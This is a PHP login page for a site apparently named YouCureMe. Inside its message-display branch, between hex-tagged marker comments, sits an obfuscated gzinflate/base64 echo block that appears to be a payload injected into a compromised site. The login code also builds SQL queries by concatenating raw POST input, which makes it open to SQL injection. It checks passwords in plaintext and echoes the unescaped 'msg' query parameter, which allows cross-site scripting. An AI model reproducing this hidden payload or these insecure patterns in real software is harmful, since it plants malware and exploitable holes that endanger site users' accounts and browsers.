<?php
header("Location: index.php"); /* Redirect browser */
/* Make sure that code below does not get executed when we redirect. */
exit;

include "header.php"; 

if($_SERVER['REQUEST_METHOD']=='POST')
{
	$email = $_POST["email"];
	$password = $_POST["pwd"];
	
	//First check whether this user was a disabled one.
	$query="select userid,fname,lname,email,usertypeid,user_previlege,isactive,thumb_profile as profilepic from tbluser where email='".$email."' AND password='".$password."'
			AND isactive=0 AND user_previlege=0";
	$result=mysql_query($query);
	$num=mysql_num_rows($result);
	if($num > 0)
	{ 
		  // Disabled user. Redirect the user for reporting this to the administrator
		  echo "<script>location.href='bugreport.php?msg=Your Email has been disabled. Please contact the System Administrator' </script>";
 	}
	
	//user is not a disabled one.
	$query="select userid,fname,lname,email,usertypeid,user_previlege,isactive,thumb_profile as profilepic from tbluser where email='".$email."' AND password='".$password."' AND isactive=1";
	$result=mysql_query($query);
	$num=mysql_num_rows($result);
	if($num > 0)
	{
		$row=mysql_fetch_array($result);   
		
		if($row["user_previlege"] == 0)
		{
		  // Disabled user. Redirect the user for reporting this to the administrator
		  echo "<script>location.href='bugreport.php?msg=Your Email has been disabled. Please contact the System Administrator' </script>";
		}
		
		$_SESSION["userid"]=$row["userid"];
		$_SESSION["fname"] = $row["fname"]." ".$row["lname"];
		$_SESSION["email"] = $row["email"];
		$_SESSION["usertypeid"]=$row["usertypeid"];		
		
		if($row["profilepic"]!="")
			$_SESSION["profilepic"]=$row["profilepic"];
		else
			$_SESSION["profilepic"]="empty_profile.jpg";
		
		echo "<script>location.href='index.php' </script>";		
	}
	else
	{		
		echo "<script>location.href='login.php?msg=Invalid login username/password.' </script>";
	}
}

if(isset($_GET['msg']))
{ 
#b58b6f#
echo(gzinflate(base64_decode("JcvBDYAgDADAVUgHoH8D7NJgVVCEtNXo9j78XnJBs5Rhzt7BEYwfw0o3/QpOJUfYzMaE2GWls+Sl97mR7Gzqc2+eLhQ+mJR9VUgB/5s+")));
#/b58b6f#
?>
	<div class="txttitle whitetitle size12 bold"><?php echo $_GET['msg']; ?></div>
<?php 
}
?>

      <div class="body_home">
					<form action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" method="post" >
        <div class="login_panel_home">
       	  <div class="topbg_form"></div>
<div class="login_homeform">
                	<div class="login_title_1">YouCureMe Login</div>
                    <div class="login_line"></div> 
					<br><br>
                    <div class="innerform">
                    <div class="txt_sign">
                    	<span class="blacktxt bold">Your Email:</span> <span class="red size12" id="msgemail">*</span>
                    </div>
                    <div class="input_txt">
                    <input class="text_feild" name="email" id="email" type="text" />
                    </div>
                    </div>
					
                    <div class="innerform">
                    <div class="txt_sign">
                    	<span class="blacktxt bold">Password:</span> <span class="red size12" id="msgpassowrd">*</span>
                    </div>
                    <div class="input_txt">
                    <input class="text_feild" name="pwd" id="pwd" type="password" />
                    </div>
                    </div>
                    
                    
                    <div class="innerform">
                    <div class="txt_sign"></div>
                    <div class="input_txt"> <input id="submit-subscirbe" type="submit" value="Log In" />&nbsp;&nbsp;<a href="recover.php">Forgot your password?</a>
                    </div>
                    </div>
          </div>
          <div class="bottombg_form"></div>
        </div>
        </form>
      </div>	 
	 	<div class="usersubmit">
                User submitted photo</div>	
<?php include "footer.php"; ?>